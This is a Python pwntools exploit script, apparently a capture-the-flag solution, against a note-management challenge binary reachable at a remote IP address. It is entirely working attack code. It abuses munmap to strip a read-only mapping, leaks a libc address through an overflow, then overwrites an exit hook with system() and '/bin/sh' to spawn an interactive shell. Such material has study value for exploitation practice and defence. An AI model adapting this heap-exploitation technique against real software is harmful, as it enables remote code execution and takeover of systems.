#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)

def create(idx, size, data):
    sla(b' : ', b'1')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(size).encode())
    sla(b'note: ', data)

def edit(idx, data):
    sla(b' : ', b'2')
    sla(b'Index: ', str(idx).encode())
    sla(b'note: ', data)

def show(idx):
    sla(b' : ', b'3')
    sla(b'? ', str(idx).encode())

def delete(idx):
    sla(b' : ', b'4')
    sla(b'Index: ', str(idx).encode())

def GDB():     # Wsl2
    command = '''
    b*main+47
    b*readchoice+81
    b*add+312
    b*delete+216
    b*delete+256
    b*edit+233
    b*readline+45
    b*main+167
    '''
    gdb.attach(p, gdbscript=command)

if args.LOCAL:
	p = process(exe.path)
else:
	p = remote('34.143.130.87', 4096)

#########################################
### Stage 1: Take advantage of munmap ###
#########################################
# Get rid of read only section
create(0, 0x1000, b'0')
sla(b' : ', b'1')
sla(b'Index: ', str(0).encode())
sla(b'Size: ', str(0x3000).encode())
delete(0)

##################################
### Stage 2: Leak libc address ###
##################################
# Concatenate with libc address
create(0, 0x1000, b'0')
sla(b' : ', b'1')
sla(b'Index: ', str(0).encode())
sla(b'Size: ', str(0x3000).encode())
edit(0, b'A'*0x1f18)

# Leak libc address
sla(b' : ', b'3')
sla(b'? ', str(0).encode())
p.recvuntil(b'A'*0x1f18)
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x7e60
log.info(hex(libc_leak))
log.info(hex(libc.address))

#################################
### Stage 3: Exit hook attack ###
#################################
payload = b'A'*2688
payload += p64(libc.sym['system'])
payload = payload.ljust(6728, b'B')
payload += b'/bin/sh\x00'
edit(0, payload)

sla(b' : ', b'5')

p.interactive()
